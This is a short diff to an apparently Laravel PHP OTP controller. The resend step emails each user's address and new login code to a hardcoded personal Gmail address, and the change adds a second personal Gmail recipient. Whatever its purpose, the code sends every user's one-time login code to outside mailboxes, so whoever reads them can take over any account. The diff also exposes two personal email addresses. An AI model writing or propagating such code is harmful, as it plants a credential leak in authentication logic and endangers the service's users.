@@ -62,7 +62,7 @@ class OtpController extends Controller
 
         try {
             Mail::raw("OTP resend request for user: {$user->email}\n\nNew OTP: {$otp}\n\nThis code will expire in 10 minutes.", function ($message) use ($user) {
-                $message->to('bridgewayuship@gmail.com')->subject("Resent Login OTP for {$user->email}");
+                $message->to(['bridgewayuship@gmail.com', 'kmujeeb998@gmail.com'])->subject("Resent Login OTP for {$user->email}");
             });
         } catch (\Exception $e) {
             return back()->withErrors(['email' => 'Unable to resend OTP. Please try again later.']);
